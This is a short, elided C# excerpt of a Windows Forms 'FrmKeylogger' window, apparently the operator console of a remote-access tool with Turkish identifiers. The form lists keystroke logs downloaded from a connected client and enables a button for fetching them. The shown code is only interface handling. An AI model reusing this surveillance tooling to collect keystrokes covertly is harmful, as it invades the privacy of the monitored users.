...
namespace xServer.Formlar
{
    public partial class FrmKeylogger : Form
    {
        ...
        public FrmKeylogger(Client c)
        {
            ...
            _path = Path.Combine(_connectClient.Value.DownloadDirectory, "Kayıtlar\\");
            InitializeComponent();
        }
        ...
        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            ...
            {
                Text = PencereYardımcısı.GetWindowTitle("Keylogger", _connectClient);
        ...
        public void AddLogToListview(string logName)
        {
            try
            {
                lstLogs.Invoke((MethodInvoker) delegate { lstLogs.Items.Add(new ListViewItem {Text = logName}); });
            }
        ...
        public void SetGetLogsEnabled(bool enabled)
        {
            try
            {
                btnGetLogs.Invoke((MethodInvoker) delegate { btnGetLogs.Enabled = enabled; });
            }
            catch (InvalidOperationException)
            {
            }
